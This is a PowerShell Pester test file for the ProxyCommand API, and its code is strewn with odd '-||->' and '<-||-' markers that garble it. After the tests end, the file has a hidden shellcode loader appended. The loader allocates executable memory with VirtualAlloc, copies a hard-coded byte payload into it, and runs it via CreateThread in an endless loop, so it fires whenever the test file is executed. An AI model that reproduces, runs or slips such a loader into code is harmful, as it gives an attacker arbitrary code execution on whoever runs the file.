

using namespace System.Management.Automation
using namespace System.Collections.ObjectModel

 -||-> Describe 'ProxyCommand Tests' -Tags "CI" {
     -||-> BeforeAll {
         -||-> function NormalizeCRLF {
            param ($helpObj)

             -||-> if( -||-> $helpObj.Synopsis.Contains("`r`n") <-||- )
            {
                 -||-> $helpObjText = ( -||-> $helpObj.Synopsis <-||- ).replace("`r`n", [System.Environment]::NewLine).trim() <-||- 
            }
            else
            {
                 -||-> $helpObjText = ( -||-> $helpObj.Synopsis <-||- ).replace("`n", [System.Environment]::NewLine).trim() <-||- 
            } <-||- 

            return  -||-> $helpObjText <-||- 
        } <-||- 

         -||-> function GetSectionText {
            param ($object)
             -||-> $texts =  -||-> $object | Out-String -Stream | ForEach-Object {
                 -||-> if ( -||-> ![string]::IsNullOrWhiteSpace($_) <-||- ) {  -||-> $_.Trim() <-||-  } <-||- 
            } <-||-  <-||- 
             -||-> $texts -join "" <-||- 
        } <-||- 

         -||-> function ProxyTest {
            [CmdletBinding(DefaultParameterSetName='Name')]
            param (
                [Parameter(ParameterSetName="Name", Mandatory=$true)]
                [ValidateSet("Orange", "Apple")]
                [string] $Name,

                [Parameter(ParameterSetName="Id", Mandatory=$true)]
                [ValidateRange(1,5)]
                [int] $Id,

                [Parameter(ValueFromPipeline)]
                [string] $Message
            )

            DynamicParam {
                 -||-> $ParamAttrib  = [parameter]::new() <-||- 
                 -||-> $ParamAttrib.Mandatory  = $true <-||- 

                 -||-> $AttribColl = [Collection[System.Attribute]]::new() <-||- 
                 -||-> $AttribColl.Add($ParamAttrib) <-||- 

                 -||-> $RuntimeParam  = [RuntimeDefinedParameter]::new('LastName', [string], $AttribColl) <-||- 
                 -||-> $RuntimeParamDic  = [RuntimeDefinedParameterDictionary]::new() <-||- 
                 -||-> $RuntimeParamDic.Add('LastName',  $RuntimeParam) <-||- 
                return   -||-> $RuntimeParamDic <-||- 
            }

            Begin {
                 -||-> $AllMessages = @() <-||- 
                 -||-> if ( -||-> $PSCmdlet.ParameterSetName -eq "Name" <-||- ) {
                     -||-> $MyString = $Name, $PSBoundParameters['LastName'] -join "," <-||- 
                } else {
                     -||-> $MyString = $Id, $PSBoundParameters['LastName'] -join "," <-||- 
                } <-||- 
            }

            Process {
                 -||-> if ( -||-> $Message <-||- ) {
                     -||-> $AllMessages += $Message <-||- 
                } <-||- 
            }

            End {
                 -||-> $MyString + " - " + ( -||-> $AllMessages -join ";" <-||- ) <-||- 
            }
        } <-||- 
    } <-||- 

     -||-> It "Test ProxyCommand.GetHelpComments" {
         -||-> $helpObj =  -||-> Get-Help Get-Alias -Full <-||-  <-||- 
         -||-> $helpContent = [System.Management.Automation.ProxyCommand]::GetHelpComments($helpObj) <-||- 

         -||-> $funcBody = @"
    

    param({1})
"@ <-||- 
         -||-> $params = $helpObj.parameters.parameter <-||- 
         -||-> $paramString = '${0}' -f $params[0].name <-||- 
        for ( -||-> $i = 1 <-||- ;  -||-> $i -lt $params.Length <-||- ;  -||-> $i++ <-||- ) {
             -||-> $paramString += ',${0}' -f $params[$i].name <-||- 
        }

         -||-> $bodyToUse = $funcBody -f $helpContent, $paramString <-||- 
         -||-> $bodySB = [scriptblock]::Create($bodyToUse) <-||- 
         -||-> Set-Item -Path function:\TestHelpComment -Value $bodySB <-||- 
         -||-> $newHelpObj =  -||-> Get-Help TestHelpComment -Full <-||-  <-||- 

         -||-> $helpObjText =  -||-> NormalizeCRLF -helpObj $helpObj <-||-  <-||- 
         -||-> $newHelpObjText =  -||-> NormalizeCRLF -helpObj $newHelpObj <-||-  <-||- 

         -||-> $helpObjText | Should -Be $newHelpObjText <-||- 
         -||-> $oldDespText =  -||-> GetSectionText $helpObj.description <-||-  <-||- 
         -||-> $newDespText =  -||-> GetSectionText $newHelpObj.description <-||-  <-||- 
         -||-> $oldDespText | Should -Be $newDespText <-||- 

         -||-> $oldParameters = @( -||-> $helpObj.parameters.parameter <-||- ) <-||- 
         -||-> $newParameters = @( -||-> $newHelpObj.parameters.parameter <-||- ) <-||- 
         -||-> $oldParameters.Length | Should -Be $newParameters.Length <-||- 
         -||-> $oldParameters.name -join "," | Should -Be ( -||-> $newParameters.name -join "," <-||- ) <-||- 

         -||-> $oldExamples = @( -||-> $helpObj.examples.example <-||- ) <-||- 
         -||-> $newExamples = @( -||-> $newHelpObj.examples.example <-||- ) <-||- 
         -||-> $oldExamples.Length | Should -Be $newExamples.Length <-||- 
    } <-||- 

     -||-> It "Test generate proxy command" {
         -||-> $cmdInfo =  -||-> Get-Command -Name Get-Content <-||-  <-||- 
         -||-> $cmdMetadata = [CommandMetadata]::new($cmdInfo) <-||- 
         -||-> $proxyBody = [ProxyCommand]::Create($cmdMetadata, "--DummyHelpContent--") <-||- 
         -||-> $proxyBody | Should -Match '--DummyHelpContent--' <-||- 

         -||-> $proxyBodySB = [scriptblock]::Create($proxyBody) <-||- 
         -||-> Set-Item -Path function:\MyGetContent -Value $proxyBodySB <-||- 

         -||-> $expectedContent = "Hello World" <-||- 
         -||-> Set-Content -Path $TestDrive\content.txt -Value $expectedContent -Encoding Unicode <-||- 
         -||-> $myContent =  -||-> MyGetContent -Path $TestDrive\content.txt -Encoding Unicode <-||-  <-||- 
         -||-> $myContent | Should -Be $expectedContent <-||- 
    } <-||- 

     -||-> It "Test generate individual components" {
         -||-> $cmdInfo =  -||-> Get-Command -Name ProxyTest <-||-  <-||- 
         -||-> $cmdMetadata = [CommandMetadata]::new($cmdInfo) <-||- 
         -||-> $template = @"
{0}
param(
{1}
)

DynamicParam {{
{2}
}}

Begin {{
{3}
}}

Process {{
{4}
}}

End {{
{5}
}}
"@ <-||- 

         -||-> $cmdletBindig = [ProxyCommand]::GetCmdletBindingAttribute($cmdMetadata) <-||- 
         -||-> $params = [ProxyCommand]::GetParamBlock($cmdMetadata) <-||- 
         -||-> $dynamicParams = [ProxyCommand]::GetDynamicParam($cmdMetadata) <-||- 
         -||-> $begin = [ProxyCommand]::GetBegin($cmdMetadata) <-||- 
         -||-> $process = [ProxyCommand]::GetProcess($cmdMetadata) <-||- 
         -||-> $end = [ProxyCommand]::GetEnd($cmdMetadata) <-||- 

         -||-> $funcBody = $template -f $cmdletBindig, $params, $dynamicParams, $begin, $process, $end <-||- 
         -||-> $bodySB = [scriptblock]::Create($funcBody) <-||- 
         -||-> Set-Item -Path function:\MyProxyTest -Value $bodySB <-||- 

         -||-> $cmdMyProxyTest =  -||-> Get-Command MyProxyTest <-||-  <-||- 
         -||-> $dyParam =  -||-> $cmdMyProxyTest.Parameters.GetEnumerator() | Where-Object {  -||-> $_.Value.IsDynamic <-||-  } <-||-  <-||- 
         -||-> $dyParam.Key | Should -Be 'LastName' <-||- 

         -||-> $result =  -||-> "Msg1", "Msg2" | MyProxyTest -Name Apple -LastName Last <-||-  <-||- 
         -||-> $result | Should -Be "Apple,Last - Msg1;Msg2" <-||- 

         -||-> $result =  -||-> "Msg1", "Msg2" | MyProxyTest -Id 3 -LastName Last <-||-  <-||- 
         -||-> $result | Should -Be "3,Last - Msg1;Msg2" <-||- 
    } <-||- 
} <-||- 

 -||-> $Wlm3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $Wlm3 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xeb,0xbb,0x21,0xdb,0x61,0xea,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xc7,0x04,0x31,0x5f,0x14,0x03,0x5f,0x35,0x39,0x94,0x16,0xdd,0x3f,0x57,0xe7,0x1d,0x20,0xd1,0x02,0x2c,0x60,0x85,0x47,0x1e,0x50,0xcd,0x0a,0x92,0x1b,0x83,0xbe,0x21,0x69,0x0c,0xb0,0x82,0xc4,0x6a,0xff,0x13,0x74,0x4e,0x9e,0x97,0x87,0x83,0x40,0xa6,0x47,0xd6,0x81,0xef,0xba,0x1b,0xd3,0xb8,0xb1,0x8e,0xc4,0xcd,0x8c,0x12,0x6e,0x9d,0x01,0x13,0x93,0x55,0x23,0x32,0x02,0xee,0x7a,0x94,0xa4,0x23,0xf7,0x9d,0xbe,0x20,0x32,0x57,0x34,0x92,0xc8,0x66,0x9c,0xeb,0x31,0xc4,0xe1,0xc4,0xc3,0x14,0x25,0xe2,0x3b,0x63,0x5f,0x11,0xc1,0x74,0xa4,0x68,0x1d,0xf0,0x3f,0xca,0xd6,0xa2,0x9b,0xeb,0x3b,0x34,0x6f,0xe7,0xf0,0x32,0x37,0xeb,0x07,0x96,0x43,0x17,0x83,0x19,0x84,0x9e,0xd7,0x3d,0x00,0xfb,0x8c,0x5c,0x11,0xa1,0x63,0x60,0x41,0x0a,0xdb,0xc4,0x09,0xa6,0x08,0x75,0x50,0xae,0xfd,0xb4,0x6b,0x2e,0x6a,0xce,0x18,0x1c,0x35,0x64,0xb7,0x2c,0xbe,0xa2,0x40,0x53,0x95,0x13,0xde,0xaa,0x16,0x64,0xf6,0x68,0x42,0x34,0x60,0x59,0xeb,0xdf,0x70,0x66,0x3e,0x75,0x74,0xf0,0x01,0x22,0x74,0x02,0xea,0x31,0x79,0x13,0xb6,0xbc,0x9f,0x43,0x16,0xef,0x0f,0x23,0xc6,0x4f,0xe0,0xcb,0x0c,0x40,0xdf,0xeb,0x2e,0x8a,0x48,0x81,0xc0,0x63,0x20,0x3d,0x78,0x2e,0xba,0xdc,0x85,0xe4,0xc6,0xde,0x0e,0x0b,0x36,0x90,0xe6,0x66,0x24,0x44,0x07,0x3d,0x16,0xc2,0x18,0xeb,0x3d,0xea,0x8c,0x10,0x94,0xbd,0x38,0x1b,0xc1,0x89,0xe6,0xe4,0x24,0x82,0x2f,0x71,0x87,0xfc,0x4f,0x95,0x07,0xfc,0x19,0xff,0x07,0x94,0xfd,0x5b,0x54,0x81,0x01,0x76,0xc8,0x1a,0x94,0x79,0xb9,0xcf,0x3f,0x12,0x47,0x36,0x77,0xbd,0xb8,0x1d,0x89,0x81,0x6e,0x5b,0xff,0xeb,0xb2 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $dFd=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $dFd.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$dFd,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



